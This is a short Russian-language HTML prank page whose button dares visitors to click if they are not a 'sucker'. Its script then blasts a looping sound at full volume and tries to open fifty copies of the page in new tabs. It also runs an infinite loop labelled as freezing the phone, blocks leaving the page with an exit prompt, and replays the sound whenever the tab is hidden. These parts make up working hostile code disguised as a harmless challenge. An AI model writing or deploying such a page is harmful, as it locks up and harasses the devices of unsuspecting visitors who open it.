
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ты не лох?</title>
    <style>
        body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: black;
            color: white;
            font-size: 3rem;
            font-family: Arial, sans-serif;
            text-transform: uppercase;
            text-align: center;
            flex-direction: column;
        }
        #big-button {
            font-size: 4rem;
            padding: 40px 80px;
            margin-top: 20px;
            cursor: pointer;
            background-color: red;
            color: white;
            border: none;
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <div>Нажми, если не лох!</div>
    <button id="big-button" onclick="startMadness()">НАЖМИ!</button>
    <audio id="sound" src="https://www.myinstants.com/media/sounds/stony-prank-mem-2025.mp3" loop></audio>

    <script>
        let sound = document.getElementById("sound");

        function startMadness() {
            sound.volume = 1.0; // Громкость на максимум
            sound.play().catch(err => console.log("Ошибка автозапуска:", err));

            setTimeout(spamTabs, 500); // Открытие вкладок через 0.5 сек
            setTimeout(freezePhone, 1500); // Запуск зависания через 1.5 сек
            document.getElementById("big-button").style.display = "none"; // Прячем кнопку
        }

        function spamTabs() {
            for (let i = 0; i < 50; i++) { // Открываем 50 вкладок
                window.open(window.location.href, '_blank');
            }
        }

        function freezePhone() {
            while (true) {
                console.log("Телефон зависает...");
            }
        }

        window.onbeforeunload = function() {
            return "Ты точно хочешь уйти?";
        };

        // Продолжение звука при сворачивании (для Android)
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                sound.play();
            }
        });
    </script>
</body>
</html>
